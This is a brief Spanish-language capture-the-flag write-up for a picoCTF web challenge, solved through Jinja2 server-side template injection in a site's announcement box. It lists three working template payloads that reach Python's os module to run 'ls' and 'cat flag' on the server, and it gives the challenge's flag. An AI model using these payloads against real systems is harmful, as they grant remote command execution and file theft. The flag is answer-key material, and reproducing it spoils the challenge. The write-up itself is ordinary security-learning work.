## Descripción 
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:49427/)!
## Solución 
Aplicando SSTI, en el bloque de texto de la página 

Verifica que el server usa Jinga2
```
{{ self.__init__.__globals__ }}
```

Listar archivos en el servidor:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

Se ve que contiene un archivo llamado flag, leemos el contenido de ese archivo que contiene la bandera:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
## Notas
## Referencias